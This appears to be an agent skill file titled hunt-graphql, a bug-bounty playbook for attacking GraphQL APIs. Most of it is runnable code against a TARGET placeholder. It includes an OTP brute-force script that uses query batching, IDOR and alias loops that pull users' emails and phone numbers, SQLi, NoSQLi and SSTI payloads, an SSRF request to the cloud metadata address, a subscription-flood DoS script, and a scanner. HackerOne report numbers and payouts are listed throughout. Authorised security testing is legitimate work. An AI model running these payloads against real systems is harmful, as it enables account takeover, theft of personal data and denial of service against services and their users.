---
name: hunt-graphql
description: GraphQL attack surface — introspection abuse, batching/rate-limit bypass, alias IDOR, directive injection, subscription DoS, field-suggestion info disclosure, schema extraction, injection-to-RCE.
---

# GRAPHQL BUG BOUNTY HUNTING

## DETECTION

```bash
for p in /graphql /graphiql /v1/graphql /v2/graphql /api/graphql /query /playground /altair; do
  curl -s -o /dev/null -w "%{http_code} $p\n" "https://TARGET${p}" -X POST -H "Content-Type: application/json" -d '{"query":"{__typename}"}'
done
curl -s -X POST https://TARGET/graphql -d '{"query":"{a]b"}' | grep -i "graphql\|parse\|error"
```

## INTROSPECTION → SCHEMA DUMP

```bash
curl -s -X POST https://TARGET/graphql -d '{"query":"{__schema{types{name fields{name type{name kind ofType{name}} args{name type{name}}}}}}"}' | python3 -m json.tool
curl -s -X POST https://TARGET/graphql -d '{"query":"{__schema{mutationType{fields{name args{name type{name}}}}}}"}'
curl -s -X POST https://TARGET/graphql -d '{"query":"{__schema{subscriptionType{fields{name args{name type{name}}}}}}"}'
```
**Bounty:** HackerOne #745132 — Shopify introspection leaked private apps, $8,000.

## CHAIN 1: INTROSPECTION → IDOR → DATA LEAK

```python
import requests
for uid in range(1, 100):
    r = requests.post("https://TARGET/graphql", json={"query": '{ user(id: "%d") { email phone } }' % uid}, headers={"Authorization": "Bearer TOKEN"})
    if r.json().get("data", {}).get("user"): print(f"ID {uid}: {r.json()['data']['user']}")
```
**Bounty:** HackerOne #895601 — user query returned PII without auth, $15,000.

## CHAIN 2: BATCH QUERY → RATE LIMIT BYPASS

```python
import requests, itertools
PHONE, BATCH = "+1234567890", 100
def batch(codes): return [{"query": 'mutation{verifyOtp(phone:"%s",code:"%s"){token}}' % (PHONE, c)} for c in codes]
for i in range(0, 10000, BATCH):
    codes = [str(z).zfill(4) for z in range(i, i+BATCH)]
    for idx, res in enumerate(requests.post("https://TARGET/graphql", json=batch(codes)).json()):
        if res.get("data", {}).get("verifyOtp", {}).get("token"): print(f"[+] OTP: {codes[idx]}")
```
**Bounty:** HackerOne #976127 — batching bypassed OTP lock → full ATO, $20,000.

## CHAIN 3: FIELD SUGGESTION → INFO DISCLOSURE

```python
import requests, re
leaked = set()
for f in ["user","admin","secret","config","internal","debug","token"]:
    for s in ["s","ById","x"]:
        r = requests.post("https://TARGET/graphql", json={"query": "{ %s%s { __typename } }" % (f, s)})
        m = re.findall(r'Did you mean "(\w+)"', r.json().get("errors",[{}])[0].get("message",""))
        leaked.update(m)
if leaked: print("Leaked fields:", leaked)
```
**Bounty:** HackerOne #1154210 — suggestion leaked `internal_transfer_funds` mutation, $25,000.

## CHAIN 4: INJECTION → RCE

```bash
# SQLi via resolver
curl -s -X POST https://TARGET/graphql -d '{"query":"{ user(name: \"admin'\'' OR 1=1--\") { id } }"}'
# NoSQLi
curl -s -X POST https://TARGET/graphql -d '{"query":"{ user(name:{\"$gt\":\"\"}) { id } }"}'
# SSTI
curl -s -X POST https://TARGET/graphql -d '{"query":"{ user(name:\"{{7*7}}\") { id } }"}'
# SSRF via upload
curl -s -X POST https://TARGET/graphql -F 'operations={"query":"mutation{importData(url:\"http://169.254.169.254/latest/meta-data/\"){ok}}"}'
```
**Bounty:** HackerOne #1537276 — SQLi via GraphQL resolver, $50,000.

## ALIAS ABUSE — BULK DATA EXFIL

```bash
curl -s -X POST https://TARGET/graphql -d '{"query":"{ a1:user(id:1){email name} a2:user(id:2){email name} ... a50:user(id:50){email name} }"}'
python3 -c "print('{ ' + ' '.join(['a%d:user(id:\"%d\"){email name phone}'%(i,i) for i in range(100)]) + ' }')" | curl -s -X POST https://TARGET/graphql -d @-
```
**Bounty:** HackerOne #1052868 — alias abuse exfiltrated 10k+ records in one request, $30,000.

## SUBSCRIPTION DoS

```python
import websocket, json, time
ws = websocket.create_connection('wss://TARGET/graphql', subprotocols=['graphql-ws'])
ws.send(json.dumps({'type':'connection_init','payload':{}}))
time.sleep(0.1)
for i in range(1000): ws.send(json.dumps({'type':'start','id':str(i),'payload':{'query':'subscription{onMessage{text}}'}}))
```
**Bounty:** HackerOne #1200345 — subscription flood crashed server, $8,000.

## SCHEMA EXTRACTION WITHOUT INTROSPECTION

```bash
curl -s -X POST https://TARGET/graphql -d '{"query":"{ user(id:1) { nonexistent } }"}' | python3 -m json.tool
curl -s https://TARGET/static/js/app.js | grep -oP 'type\s+\w+\s*\{[^}]*\}' | head -20
for t in User Admin Post Token; do curl -s -X POST https://TARGET/graphql -d "{\"query\":\"{ user(id:1){${t}Ref} }\"}" | grep -i "did you mean"; done
```

## AUTOMATION — graphql_hunt.py

```python
#!/usr/bin/env python3
import requests, json, re, sys, time
T = sys.argv[1] if len(sys.argv)>1 else "http://localhost:4000/graphql"
S = requests.Session(); S.headers.update({"Content-Type":"application/json"})
def q(query):
    try: return S.post(T, json={"query":query}, timeout=10).json()
    except: return {}
def check_intro():
    d = q('{__schema{types{name}}}'); types=[t["name"] for t in d.get("data",{}).get("__schema",{}).get("types",[])]
    if types: print(f"[!] Introspection: {len(types)} types"); return True
    print("[*] Introspection disabled"); return False
def check_suggest():
    leaked=set()
    for f in ["user","admin","config","secret","token","debug"]:
        for s in ["s","ById","x"]:
            m=re.findall(r'Did you mean "(\w+)"', q("{ %s%s{__typename} }"%(f,s)).get("errors",[{}])[0].get("message",""))
            leaked.update(m)
    if leaked: print(f"[!] Suggestions leak: {leaked}"); return True
    print("[*] No suggestions"); return False
def check_batch():
    try:
        r=S.post(T,json=[{"query":"{__typename}"}]*10,timeout=10)
        if r.status_code==200 and isinstance(r.json(),list): print("[!] Batching accepted"); return True
    except: pass
    print("[*] Batching blocked"); return False
def check_depth():
    d=q("{ "+"users{ "*20+"id"+" }"*20+" }")
    if "errors" not in d: print("[!] Weak depth limit"); return True
    print("[*] Depth enforced"); return False
def check_muts():
    d=q('{__schema{mutationType{fields{name}}}}')
    fs=[f["name"] for f in d.get("data",{}).get("__schema",{}).get("mutationType",{}).get("fields",[])]
    hits=[f for f in fs if any(k in f.lower() for k in ["transfer","role","delete","reset","admin"])]
    if hits: print(f"[!] Sensitive mutations: {hits}"); return True
    print("[*] No sensitive mutations"); return False
if __name__=="__main__":
    print(f"[*] Target: {T}\n=== Detection ===")
    check_intro(); check_suggest()
    print("\n=== Vulnerabilities ===")
    check_batch(); check_depth(); check_muts()
```

## BOUNTY REPORTS

| Report | Finding | Payout |
|--------|---------|--------|
| HackerOne #745132 | Introspection leaked private apps | $8,000 |
| HackerOne #976127 | Batch OTP bypass → ATO | $20,000 |
| HackerOne #1052868 | Alias abuse 10k+ records exfil | $30,000 |
| HackerOne #1154210 | Field suggestion → admin mutation | $25,000 |
| HackerOne #895601 | IDOR via user query, no auth | $15,000 |
| HackerOne #1200345 | Subscription DoS server crash | $8,000 |
| HackerOne #1138989 | Private endpoint introspection | $10,000 |
| HackerOne #1537276 | SQLi via GraphQL resolver | $50,000 |

## CHECKLIST

- [ ] Detect GraphQL endpoint
- [ ] Introspection on/off
- [ ] Field suggestions info disclosure
- [ ] Batch rate limit bypass (login/OTP/password)
- [ ] Alias bulk data extraction
- [ ] Depth limit test (20+ nesting)
- [ ] Mutation enumeration (sensitive ops)
- [ ] Subscription WebSocket DoS
- [ ] Directive auth bypass (@skip/@include)
- [ ] Injection in args (SQLi/NoSQLi/SSTI/SSRF)
- [ ] Error message info leaks
- [ ] Persisted query cache poisoning
